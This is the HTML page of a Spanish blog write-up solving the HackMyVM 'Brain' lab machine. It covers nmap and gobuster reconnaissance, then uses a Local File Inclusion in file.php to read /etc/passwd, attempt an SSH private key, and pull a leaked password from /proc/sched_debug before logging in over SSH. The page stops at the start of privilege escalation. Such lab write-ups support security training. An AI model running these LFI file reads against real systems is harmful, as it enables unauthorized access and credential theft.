@@ -1,0 +1,920 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="es" class="no-js">
+  <head>
+	  
+
+    <meta charset="utf-8">
+<!-- begin _includes/seo.html --><title>HackMyVm Brain Writeup - RiJaba1’s Page</title>
+<meta name="description" content="En este artículo os enseño a como vulnerar la máquina Brain de HackMyVM">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="es_ES">
+<meta property="og:site_name" content="RiJaba1's Page">
+<meta property="og:title" content="HackMyVm Brain Writeup">
+<meta property="og:url" content="http://localhost:4000/brain-hackmyvm-writeup/">
+
+
+  <meta property="og:description" content="En este artículo os enseño a como vulnerar la máquina Brain de HackMyVM">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2022-01-02T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/brain-hackmyvm-writeup/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "RiJaba1",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-213646017-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-213646017-1');
+</script>
+
+
+    <meta name="google-site-verification" content="BHaiJMDDLAEy9jqi1sxGIzsOaRIVud__U3Gu75yYcvA">
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="RiJaba1's Page Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+
+<style>
+
+	::-moz-selection { /* Code for Firefox */
+		color: black;
+		background: #fa9975;
+	}
+
+	::selection {
+		color: black;
+		background: #fa9975;
+	}
+
+</style>
+
+    <!-- start custom head snippets -->
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+
+
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+    
+    <meta name="google-site-verification" content="BHaiJMDDLAEy9jqi1sxGIzsOaRIVud__U3Gu75yYcvA">
+    
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Artículos</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categorías</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Etiquetas</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/buscador/">Buscador</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/appsonline/">Apps-Online</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">HackMyVm Brain Writeup</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/avatar.png" alt="RiJaba1" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">RiJaba1</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cybersecurity Junior | HTB &amp; HMVM Player | Red Team Pentester
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/rijaba1" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HackMyVm Brain Writeup">
+    <meta itemprop="description" content="En este artículo os enseño a como vulnerar la máquina Brain de HackMyVM">
+    <meta itemprop="datePublished" content="January 02, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HackMyVm Brain Writeup
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-01-02T00:00:00+01:00">January 02, 2022 </time> 
+          
+          
+        </p>
+        <h1 id="brain-writeup">Brain Writeup</h1>
+
+<p>En este post os enseñaré a como vulnerar la máquina Brain de la platadorma HackMyVM. La máquina está categorizada como Easy.</p>
+
+<h2 id="reconocimiento">Reconocimiento</h2>
+
+<h3 id="reconocimiento-de-la-ip">Reconocimiento de la IP</h3>
+
+<p>La máquina ya te da la pista de cual es su IP, pero no obstante os enseñaré a como identificarla:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ <span class="c">#fping -a -g 192.163.0.0/24 2&gt;/dev/null</span>
+192.163.0.1 
+192.163.0.2 
+192.163.0.3 
+192.163.0.8  <span class="c"># Mi IP</span>
+192.163.0.53 <span class="c"># IP de la máquina</span>
+
+</code></pre></div></div>
+<p>En mi caso hay mas IP debido a que las máquinas virtuales están conectadas a una red NAT creada por VirtualBox.</p>
+
+<h3 id="nmap">NMAP</h3>
+
+<p>Para descubrir los puertos abiertos de la máquina usamos NMAP pero también podemos usar otras herramientas como <a href="http://127.0.0.1:4000/herramienta-portDiscoverSH/">portDiscoverSH</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[root@rijaba1-pc]─[~/Desktop/Brain/nmap]
+└──╼ <span class="c">#nmap -p- --open -T5 -v -n 192.163.0.53</span>
+
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-02 15:35 CET
+Initiating ARP Ping Scan at 15:35
+Scanning 192.163.0.53 <span class="o">[</span>1 port]
+Completed ARP Ping Scan at 15:35, 0.03s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating SYN Stealth Scan at 15:35
+Scanning 192.163.0.53 <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on 192.163.0.53
+Discovered open port 22/tcp on 192.163.0.53
+Completed SYN Stealth Scan at 15:35, 4.73s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>192.163.0.53
+Host is up <span class="o">(</span>0.00013s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:1A:B4:8C <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>4.89 seconds
+	Raw packets sent: 65543 <span class="o">(</span>2.884MB<span class="o">)</span> | Rcvd: 65543 <span class="o">(</span>2.622MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Este comando sirve para descubrir los puertos <strong>abiertos</strong> de la máquina, el parámetro -T5 es la plantilla de tempoizado, que comprende desde el 1 al 5, yo recomiendo usar -T4 debido a que el -T5 puede llegar a saltarse algún puerto abierto (yo uso el -T5 por qué ya había hecho el escaneo antes).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[root@rijaba1-pc]─[~/Desktop/Brain/nmap]
+└──╼ <span class="c">#nmap -sCV -p22,80 192.163.0.53</span>
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-02 15:39 CET
+Nmap scan report <span class="k">for </span>192.163.0.53
+Host is up <span class="o">(</span>0.00028s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 32:95:f9:20:44:d7:a1:d1:80:a8:d6:95:91:d5:1e:da <span class="o">(</span>RSA<span class="o">)</span>
+|   256 07:e7:24:38:1d:64:f6:88:9a:71:23:79:b8:d8:e6:57 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 58:a6:da:1e:0f:89:42:2b:ba:de:00:fc:71:78:3d:56 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
+MAC Address: 08:00:27:1A:B4:8C <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>7.20 seconds
+
+</code></pre></div></div>
+<p>Este comando de nmap nos permite averiguar las versiones y servicios que están ejecutandose en los puertos 22 y 80, el parámetro -sCV es una fusión del parámetro -sC y -sV.</p>
+
+<h3 id="fuzzing">Fuzzing</h3>
+
+<p>Cuando entramos en internet y teclamos http://IP:80/ nos sale lo siguiente:</p>
+
+<p>Para descubrir posibles rutas usaremos gobuster, también se pueden usar herramientas como wfuzz que emplearemos más adelante</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ <span class="c">#gobuster dir -u 'http://192.163.0.53/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt</span>
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://192.163.0.53/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 10
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Extensions:              html,php,txt
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2022/01/02 15:44:51 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 10701]
+/robots.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 162]  
+/brainstorm           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.163.0.53/brainstorm/]
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]                                      
+                                                                                     
+<span class="o">===============================================================</span>
+2022/01/02 15:46:32 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+<p>Con este comando buscamos todas las direcciones con formato .html, .php y .txt. Aquí lo que más llama la atención es /brainstorm. Vamos a ver lo que se muestra en el navegador cuando entramos:</p>
+
+<p align="center">
+	<img src="/assets/images/brain-hackmyvm-writeup/IMG1.PNG">
+</p>
+
+<p>Nada interesante…</p>
+
+<p>Ahora vamos a hacer el mismo fuzzing que antes sobre el directorio /brainstorm</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ <span class="c">#gobuster dir -u 'http://192.163.0.53/brainstorm/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt</span>
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://192.163.0.53/brainstorm/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 10
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Extensions:              html,php,txt
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2022/01/02 15:49:21 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 80]
+/file.php             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0] 
+                                              
+<span class="o">===============================================================</span>
+2022/01/02 15:51:02 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+
+<p>Al entrar en /file.php no encontramos nada podríamos estar delante de una Web Shell o de un LFI (Local File Inclusion), primero vamos a probar a ver si es un LFI, para ello vamos a usar la herramienta wfuzz:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ <span class="c">#wfuzz -c -t 200 --hh=0 -u 'http://192.163.0.53/brainstorm/file.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://192.163.0.53/brainstorm/file.php?FUZZ<span class="o">=</span>/etc/passwd
+Total requests: 220560
+
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                                                                                                                     
+<span class="o">=====================================================================</span>
+
+000000759:   200        26 L     38 W       1401 Ch     <span class="s2">"file"</span>
+</code></pre></div></div>
+
+<p>Rápidamente encontramos file, esto significa que estamos ante un LFI, al entrar al navegador nos encontramos con esto:</p>
+
+<p align="center">
+	<img src="/assets/images/brain-hackmyvm-writeup/IMG2.PNG">
+</p>
+
+<h2 id="obtener-acceso">Obtener Acceso</h2>
+
+<p>Para que sea más fácil de entender podemos hacer uso de curl:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ <span class="c">#curl 'http://192.163.0.53/brainstorm/file.php?file=/etc/passwd'</span>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+salomon:x:1000:1000:salomon,,,:/home/salomon:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</code></pre></div></div>
+<p>Encontamos a un usuario llamado salomon, dado que está el servicio SSH en funcionamiento podemos intentar robarle la clave id_rsa:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ <span class="c">#curl 'http://192.163.0.53/brainstorm/file.php?file=/home/salomon/.ssh/id_rsa'</span>
+┌─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ <span class="c">#</span>
+</code></pre></div></div>
+<p>En este caso no podemos hacerlo, ahora lo que podemos intentar es buscar algún <em>log</em> o archivo que nos pueda dar alguna pista.</p>
+
+<p>En este punto vamos a comprobar si tenemos permiso de lectura del archivo ‘/proc/sched_debug’, el cual nos daría información sobre los procesos que se están ejecutando en la máquina víctima:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[✗]─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ <span class="c">#curl 'http://192.163.0.53/brainstorm/file.php?file=/proc/sched_debug'</span>
+
+<span class="nt">-----------</span>
+
+runnable tasks:
+ S           task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
+<span class="nt">-----------------------------------------------------------------------------------------------------------</span>
+ S        systemd     1     63716.678589      2552   120         0.000000       569.418285         0.000000 0 0 /
+ S       kthreadd     2     63730.424674       138   120         0.000000         1.230426         0.000000 0 0 /
+ I         rcu_gp     3       115.023572         2   100         0.000000         0.001783         0.000000 0 0 /
+ I     rcu_par_gp     4       116.523710         2   100         0.000000         0.000963         0.000000 0 0 /
+ I   kworker/0:0H     6       873.675936         6   100         0.000000         0.020983         0.000000 0 0 /
+ I   kworker/u2:0     7     63680.909027       683   120         0.000000        49.459140         0.000000 0 0 /
+ I   mm_percpu_wq     8       122.093852         2   100         0.000000         0.001041         0.000000 0 0 /
+ S    ksoftirqd/0     9     63734.905091     96268   120         0.000000      2008.140206         0.000000 0 0 /
+ I      rcu_sched    10     63738.789502    201645   120         0.000000      1101.001688         0.000000 0 0 /
+ I         rcu_bh    11       128.095063         2   120         0.000000         0.000611         0.000000 0 0 /
+ S    migration/0    12         0.000000      2052     0         0.000000        44.676092         0.000000 0 0 /
+ S        cpuhp/0    14      1169.032602        11   120         0.000000         0.087116         0.000000 0 0 /
+ S      kdevtmpfs    15      1192.514680       148   120         0.000000         0.370252         0.000000 0 0 /
+ I          netns    16       140.113027         2   100         0.000000         0.001332         0.000000 0 0 /
+ S        kauditd    17      1157.126260         4   120         0.000000         0.023842         0.000000 0 0 /
+ S     khungtaskd    18     63697.348687        69   120         0.000000         1.633504         0.000000 0 0 /
+ S     oom_reaper    19       146.114372         2   120         0.000000         0.000883         0.000000 0 0 /
+ I      writeback    20       148.114399         2   100         0.000000         0.001175         0.000000 0 0 /
+ S     kcompactd0    21       150.115346         2   120         0.000000         0.001261         0.000000 0 0 /
+ S           ksmd    22       152.116626         2   125         0.000000         0.001198         0.000000 0 0 /
+ S     khugepaged    23     63741.749832       817   139         0.000000        71.709128         0.000000 0 0 /
+ I         crypto    24       156.116209         2   100         0.000000         0.001691         0.000000 0 0 /
+ I    kintegrityd    25       158.116328         2   100         0.000000         0.001214         0.000000 0 0 /
+ I        kblockd    26       160.116910         2   100         0.000000         0.001825         0.000000 0 0 /
+ I    edac-poller    27       172.502000         2   100         0.000000         0.001684         0.000000 0 0 /
+ I     devfreq_wq    28       174.002316         2   100         0.000000         0.001356         0.000000 0 0 /
+ S      watchdogd    29         0.000000         2     0         0.000000         0.001319         0.000000 0 0 /
+ S        kswapd0    30     62396.089862       789   120         0.000000       519.895016         0.000000 0 0 /
+ I       kthrotld    48       556.008766         2   100         0.000000         0.002137         0.000000 0 0 /
+ I  ipv6_addrconf    49       557.208873         2   100         0.000000         0.001312         0.000000 0 0 /
+ I          kstrp    59       583.981637         2   100         0.000000         0.001553         0.000000 0 0 /
+ I        ata_sff   103       695.238146         2   100         0.000000         0.002432         0.000000 0 0 /
+ S      scsi_eh_0   105       797.647303         4   120         0.000000        11.211631         0.000000 0 0 /
+
+<span class="nt">----------------</span>
+
+ S    <span class="k">in</span>:imuxsock   333     63658.826278       219   120         0.000000         3.917773         0.000000 0 0 /
+ S      <span class="k">in</span>:imklog   334      8713.100742         5   120         0.000000         0.512810         0.000000 0 0 /
+ S  rs:main Q:Reg   341     63658.829305       275   120         0.000000         4.945284         0.000000 0 0 /
+ S           cron   328      1178.142641        37   120         0.000000         1.320024         0.000000 0 0 /
+ S       dhclient   346     63658.947787       299   120         0.000000        15.911270         0.000000 0 0 /
+ S             sh   350      1181.323932         8   120         0.000000         0.450660         0.000000 0 0 /
+ Ssalomon:XXXXXXX   355      1182.800227        19   120         0.000000         0.992876         0.000000 0 0 /
+ S         python   369     63738.785020     16658   120         0.000000       766.599960         0.000000 0 0 /
+ S          <span class="nb">sleep   </span>370      1185.145485         4   120         0.000000         0.330095         0.000000 0 0 /
+ S         agetty   394     63639.075848        54   120         0.000000         4.815542         0.000000 0 0 /
+ S           sshd   400     47171.787284        79   120         0.000000         9.011313         0.000000 0 0 /
+ S        apache2   447     63738.813279      8278   120         0.000000       426.373394         0.000000 0 0 /
+ S        apache2   933     62402.551365    120465   120         0.000000     11680.783599         0.000000 0 0 /
+ S        apache2   935     62402.570149    121210   120         0.000000     11652.524825         0.000000 0 0 /
+ S           sshd   957     23631.807253        73   120         0.000000        12.466195         0.000000 0 0 /
+ S        systemd   960     24078.702466        80   120         0.000000        12.362455         0.000000 0 0 /
+ S       <span class="o">(</span>sd-pam<span class="o">)</span>   961     23603.286953         3   120         0.000000         0.079491         0.000000 0 0 /
+ S           sshd   969     43696.981737      2929   120         0.000000        80.065888         0.000000 0 0 /
+ S           bash   970     43652.951614       840   120         0.000000        48.213812         0.000000 0 0 /
+ S             su 11753     43663.369220        18   120         0.000000         5.684415         0.000000 0 0 /
+ S           bash 11754     43697.027139        61   120         0.000000        10.535508         0.000000 0 0 /
+ S        apache2 12160     62402.521737    119215   120         0.000000     11441.040908         0.000000 0 0 /
+ S        apache2 12175     62402.521261     60943   120         0.000000      5855.319223         0.000000 0 0 /
+ S        apache2 12176     63556.634764     59731   120         0.000000      5756.314840         0.000000 0 0 /
+ S        apache2 12178     63666.769308     59574   120         0.000000      5689.522428         0.000000 0 0 /
+ I    kworker/0:0 12182     63738.858168      9678   120         0.000000       268.195123         0.000000 0 0 /
+ S        apache2 12192     62402.547221        57   120         0.000000         9.196506         0.000000 0 0 /
+ S        apache2 12293     63556.742439        14   120         0.000000         2.126920         0.000000 0 0 /
+ S        apache2 12295     63615.246831        14   120         0.000000         1.884778         0.000000 0 0 /
+<span class="o">&gt;</span>R        apache2 12296     63738.749832        13   120         0.000000         1.558960         0.000000 0 0 /
+ I    kworker/0:1 12341     63733.416116       161   120         0.000000         6.446626         0.000000 0 0 /
+ I    kworker/0:2 12351     63735.074048        74   120         0.000000         2.886262         0.000000 0 0 /
+ I    kworker/0:3 12352     63736.412425         2   120         0.000000         0.001362         0.000000 0 0 /
+
+
+</code></pre></div></div>
+<p>He tenido que cortar la salida del comando porque era muy largo… Puede que parecer que no hay nada interesante, pero sí que lo hay, podemos ver que en una parte se menciona al ya conocido usuario salomon, seguido de dos puntos que parece su contraseña (yo le pusé X).</p>
+
+<p>Con el siguiente comando vamos a intentar conectarnos por ssh con las credenciales:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[✗]─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ <span class="c">#ssh salomon@192.163.0.53</span>
+salomon@192.163.0.53<span class="s1">'s password: 
+Linux Brain 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
+
+BBBBBBBBBBBBBBBBB      RRRRRRRRRRRRRRRRR                     AAA                  IIIIIIIIII   NNNNNNNN        NNNNNNNN
+B::::::::::::::::B     R::::::::::::::::R                   A:::A                 I::::::::I   N:::::::N       N::::::N
+B::::::BBBBBB:::::B    R::::::RRRRRR:::::R                 A:::::A                I::::::::I   N::::::::N      N::::::N
+BB:::::B     B:::::B   RR:::::R     R:::::R               A:::::::A               II::::::II   N:::::::::N     N::::::N
+  B::::B     B:::::B     R::::R     R:::::R              A:::::::::A                I::::I     N::::::::::N    N::::::N
+  B::::B     B:::::B     R::::R     R:::::R             A:::::A:::::A               I::::I     N:::::::::::N   N::::::N
+  B::::BBBBBB:::::B      R::::RRRRRR:::::R             A:::::A A:::::A              I::::I     N:::::::N::::N  N::::::N
+  B:::::::::::::BB       R:::::::::::::RR             A:::::A   A:::::A             I::::I     N::::::N N::::N N::::::N
+  B::::BBBBBB:::::B      R::::RRRRRR:::::R           A:::::A     A:::::A            I::::I     N::::::N  N::::N:::::::N
+  B::::B     B:::::B     R::::R     R:::::R         A:::::AAAAAAAAA:::::A           I::::I     N::::::N   N:::::::::::N
+  B::::B     B:::::B     R::::R     R:::::R        A:::::::::::::::::::::A          I::::I     N::::::N    N::::::::::N
+  B::::B     B:::::B     R::::R     R:::::R       A:::::AAAAAAAAAAAAA:::::A         I::::I     N::::::N     N:::::::::N
+BB:::::BBBBBB::::::B   RR:::::R     R:::::R      A:::::A             A:::::A      II::::::II   N::::::N      N::::::::N
+B:::::::::::::::::B    R::::::R     R:::::R     A:::::A               A:::::A     I::::::::I   N::::::N       N:::::::N
+B::::::::::::::::B     R::::::R     R:::::R    A:::::A                 A:::::A    I::::::::I   N::::::N        N::::::N
+BBBBBBBBBBBBBBBBB      RRRRRRRR     RRRRRRR   AAAAAAA                   AAAAAAA   IIIIIIIIII   NNNNNNNN         NNNNNNN
+
+
+salomon@Brain:~$ ls
+user.txt
+salomon@Brain:~$ cat user.txt;echo
+onXXXXXvDtAR7wZu3I8HKXXXX
+
+salomon@Brain:~$
+</span></code></pre></div></div>
+<p>Bingo! Hemos ganado el acceso a la máquina y tenemos la flag del usuario</p>
+
+<h2 id="escalada-de-privilegio">Escalada de Privilegio</h2>
+
+<p>En este punto ya tenemos acceso a la máquina pero aún no somos el usuario con altos privilegios (root), para que sea más fácil la escalada de privilegios vamos a usar <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a>. LinPEAS es una herramienta que nos ayuda en esta fase.</p>
+
